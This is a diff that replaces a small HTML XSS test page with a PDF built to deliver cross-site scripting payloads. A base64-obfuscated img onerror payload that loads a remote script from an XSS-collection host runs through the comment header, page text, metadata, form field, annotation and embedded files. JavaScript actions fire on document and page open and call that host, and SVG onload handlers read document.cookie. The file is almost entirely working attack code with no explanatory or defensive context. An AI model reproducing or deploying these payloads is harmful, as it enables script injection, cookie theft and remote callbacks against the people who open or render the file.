@@ -1,10 +1,213 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>XSS Test</title>
-</head>
-<body>
-    <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veXNvci5jb20vdGVzdC5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsgonerror=eval(atob(this.id))>
-    <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="2560" height="1600" onload="alert(document.cookie)"></svg>
-</body>
-</html>
+%PDF-1.4
+% Advanced XSS Injection: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 7 0 R
+/Metadata 9 0 R
+/EmbeddedFiles [10 0 R 16 0 R]
+/AcroForm << /Fields [12 0 R] >>
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Resources 4 0 R
+/Contents 6 0 R
+/Parent 2 0 R
+/Annots [8 0 R]
+/AA << /O 13 0 R >>
+>>
+endobj
+
+4 0 obj
+<<
+/Font << /F1 5 0 R >>
+>>
+endobj
+
+5 0 obj
+<<
+/Type /Font
+/BaseFont /Helvetica
+/Subtype /Type1
+/Encoding /WinAnsiEncoding
+>>
+endobj
+
+6 0 obj
+<<
+/Length 120
+>>
+stream
+BT
+  50 500 Td
+  /F1 12 Tf
+  (<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>) Tj
+ET
+endstream
+endobj
+
+7 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (var p = "PHNjcmlwdD5hbGVydCgnWFNTIFZpYSBQREYgT3BlbkFjdGlvbicpPC9zY3JpcHQ+"; app.alert\("XSS via PDF: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
+>>
+endobj
+
+8 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [50 450 300 470]
+/Border [0 0 2]
+/A << 
+  /Type /Action
+  /S /JavaScript
+  /JS (app.alert\("XSS via Annotation: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
+>>
+>>
+endobj
+
+9 0 obj
+<<
+/Type /Metadata
+/Subtype /XML
+/Length 400
+>>
+stream
+<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+    <rdf:Description rdf:about="">
+      <pdf:Producer>XSS Payload: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))></pdf:Producer>
+      <svg:SVG xmlns:svg="http://www.w3.org/2000/svg">
+        <svg version="1.0" width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000" preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)"/>
+      </svg:SVG>
+    </rdf:Description>
+  </rdf:RDF>
+</x:xmpmeta>
+<?xpacket end="w"?>
+endstream
+endobj
+
+10 0 obj
+<<
+/Type /Filespec
+/F (payload.txt)
+/EF << /F 11 0 R >>
+>>
+endobj
+
+11 0 obj
+<<
+/Type /EmbeddedFile
+/Length 120
+>>
+stream
+<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+endstream
+endobj
+
+12 0 obj
+<<
+/Type /Annot
+/Subtype /Widget
+/FT /Tx
+/F 2
+/Rect [50 400 250 430]
+/T (XSSField)
+/V (Click to trigger XSS)
+/A << 
+  /Type /Action
+  /S /JavaScript
+  /JS (app.alert\("XSS via Form: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\("https://xss.report/c/ghostshell", true\);)
+>>
+>>
+endobj
+
+13 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (var encoded = "aHR0cHM6Ly94c3MucmVwb3J0L2MvZ2hvc3RzaGVsbA=="; app.alert\("XSS via Page Open: <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"\); app.launchURL\(util.stringFromStream\(util.streamFromString\(encoded, "ascii"\)\), true\);)
+>>
+endobj
+
+14 0 obj
+<<
+/Type /ObjStm
+/N 0
+/First 0
+/Length 0
+>>
+stream
+endstream
+endobj
+
+15 0 obj
+<<
+/AlternateXSS (<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>)
+>>
+endobj
+
+16 0 obj
+<<
+/Type /Filespec
+/F (malicious.svg)
+/EF << /F 17 0 R >>
+>>
+endobj
+
+17 0 obj
+<<
+/Type /EmbeddedFile
+/Length 200
+>>
+stream
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000" preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
+</svg>
+endstream
+endobj
+
+xref
+0 18
+0000000000 65535 f 
+0000000150 00000 n 
+0000000015 00000 n 
+0000000055 00000 n 
+0000000120 00000 n 
+0000000180 00000 n 
+0000000220 00000 n 
+0000000300 00000 n 
+0000000400 00000 n 
+0000000500 00000 n 
+0000000600 00000 n 
+0000000700 00000 n 
+0000000800 00000 n 
+0000000900 00000 n 
+0000001000 00000 n 
+0000001100 00000 n 
+0000001200 00000 n 
+0000001300 00000 n 
+trailer
+<<
+/ID [(w4f) (w4f)]
+/Root 1 0 R
+/Size 18
+>>
+startxref
+1400
+%%EOF
